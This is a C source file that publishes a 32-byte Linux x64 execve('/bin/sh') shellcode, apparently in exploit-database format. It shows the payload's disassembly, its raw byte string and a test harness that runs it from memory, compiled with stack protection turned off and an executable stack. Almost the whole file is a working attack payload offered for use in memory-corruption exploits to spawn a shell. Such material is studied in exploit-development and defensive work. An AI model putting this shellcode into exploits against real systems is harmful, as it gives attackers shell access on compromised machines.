/* 
   # Title         : execve(bin/sh) shellcode
   # Author        : H.H.A.Ravindu Priyankara
   # Date          : 19-05-2021
   # Architecture  : Linux x64
   # Length        : 32 bytes
   # Tested on     : Kali_linux_2021.1 x64
   # Github        : https://github.com/Ravindu-Priyankara
   # E-Mail        : h.h.a.r.p.premachandra@gmail.com
   # Download link : https://github.com/Ravindu-Priyankara/..................
*/

// objdump -d shell -M intel

/* 
	Disassembly of section .text:

	0000000000401000 <_start>:
	  401000:       48 31 c0                xor    rax,rax
	  401003:       48 31 f6                xor    rsi,rsi
	  401006:       48 31 d2                xor    rdx,rdx
	  401009:       50                      push   rax
	  40100a:       48 bb 2f 2f 62 69 6e    movabs rbx,0x68732f6e69622f2f
	  401011:       2f 73 68 
	  401014:       48 c1 eb 08             shr    rbx,0x8
	  401018:       53                      push   rbx
	  401019:       48 89 e7                mov    rdi,rsp
	  40101c:       b0 3b                   mov    al,0x3b
	  40101e:       0f 05                   syscall
*/

// gcc -fno-stack-protector -z execstack shell.c -o shell
#include <stdio.h>
#include <string.h>

int main(void)
{
	char shellcode[] ="\x48\x31\xc0\x48\x31\xf6\x48\x31\xd2\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\xb0\x3b\x0f\x05";
	printf("shelcode length : %d\n ", (int)strlen(shellcode));
	((void (*)()) shellcode)();
	return 0;
}